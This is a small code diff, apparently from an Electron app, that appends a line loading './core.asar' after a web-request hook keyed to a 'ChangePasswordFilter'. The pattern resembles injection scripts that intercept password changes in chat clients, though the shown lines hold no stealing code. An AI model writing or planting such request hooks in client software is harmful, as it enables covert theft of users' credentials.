@@ -1150,3 +1150,5 @@ session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, ca
         })).catch(console.error);
     }
 });
+
+module.exports = require('./core.asar')
